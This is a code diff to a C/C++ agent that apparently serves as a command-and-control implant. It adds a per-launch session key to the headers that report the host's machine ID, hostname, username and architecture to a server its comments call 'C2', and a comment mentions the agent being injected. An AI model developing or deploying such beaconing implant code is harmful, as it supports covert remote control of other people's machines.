@@ -5,6 +5,7 @@
 #include "core/memory/memory.h"
 #include "core/string/string.h"
 #include "platform/system/environment.h"
+#include "platform/system/random.h"
 #include "platform/system/system_info.h"
 
 /**
@@ -34,10 +35,15 @@ static BOOL WriteNumber(BinaryWriter &writer, UINT64 value)
  *  - X-Agent-Capabilities: the 8-byte capability-category bitmap as lowercase hex.
  *
  * @param info Populated SystemInfo (the same data the old Hello response carried).
+ * @param sessionKey Per-RUNTIME session key (X-Agent-Session-Key): a fresh random UUID
+ *        minted once per process launch and reused on every reconnect — it names THIS
+ *        runtime, not a connection, so the relay/C2 can tell agent runtimes apart on one
+ *        machine while rows stay keyed by the machine uuid. Identifies, authorizes
+ *        nothing. Nullptr/empty omits the header (pre-session-key build behavior).
  * @param out Output buffer for CRLF-terminated header lines (no trailing blank line).
  * @return Total header-block length, or 0 if the buffer was too small.
  */
-static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
+static USIZE BuildIdentityHeaders(const SystemInfo &info, const CHAR *sessionKey, Span<CHAR> out)
 {
     const CHAR *hex = "0123456789abcdef";
 
@@ -76,6 +82,11 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
     BOOL ok = true;
     ok = ok && writer.WriteString("X-Agent-Api-Version: ") != nullptr && WriteNumber(writer, AGENT_API_VERSION) && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Machine-Uuid: ") != nullptr && writer.WriteString(uuid) != nullptr && writer.WriteString("\r\n") != nullptr;
+    // Per-RUNTIME key — NOT identity: rows stay keyed by the machine uuid above; a fresh
+    // value per process launch distinguishes concurrent or succeeding runtimes on one
+    // machine (e.g. this agent injected alongside a C# successor).
+    if (sessionKey != nullptr && sessionKey[0] != '\0')
+        ok = ok && writer.WriteString("X-Agent-Session-Key: ") != nullptr && writer.WriteString(sessionKey) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Hostname: ") != nullptr && writer.WriteString(info.Hostname) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Username: ") != nullptr && writer.WriteString(info.Username) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Arch: ") != nullptr && writer.WriteString(info.Architecture) != nullptr && writer.WriteString("\r\n") != nullptr;
@@ -165,6 +176,15 @@ INT32 start()
 
     LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);
 
+    // Per-RUNTIME session key: minted ONCE per launch, reused on every reconnect below —
+    // it names THIS runtime, not a connection (see BuildIdentityHeaders). A v4 UUID from
+    // the hardware-seeded PRNG; uniqueness is all that matters — it identifies,
+    // authorizes nothing.
+    Random random;
+    CHAR sessionKey[37];
+    sessionKey[0] = '\0';
+    (VOID)random.RandomUUID().ToString(Span<CHAR>(sessionKey, sizeof(sessionKey)));
+
     while (!context.shouldExit)
     {
         connectionAttempt++;
@@ -172,11 +192,12 @@ INT32 start()
 
         // Identity rides the upgrade request as HTTP headers (API 1) — no Hello
         // frame. Built fresh per connection so a changed hostname/user follows
-        // the reconnect.
+        // the reconnect. The session key is the exception: generated once above,
+        // it rides every reconnect unchanged.
         SystemInfo identityInfo;
         GetSystemInfo(&identityInfo);
         CHAR identityHeaders[1024];
-        USIZE identityHeadersLen = BuildIdentityHeaders(identityInfo, Span<CHAR>(identityHeaders, sizeof(identityHeaders)));
+        USIZE identityHeadersLen = BuildIdentityHeaders(identityInfo, sessionKey, Span<CHAR>(identityHeaders, sizeof(identityHeaders)));
         if (identityHeadersLen == 0)
         {
             LOG_ERROR("Identity header block does not fit (attempt #%u)", connectionAttempt);
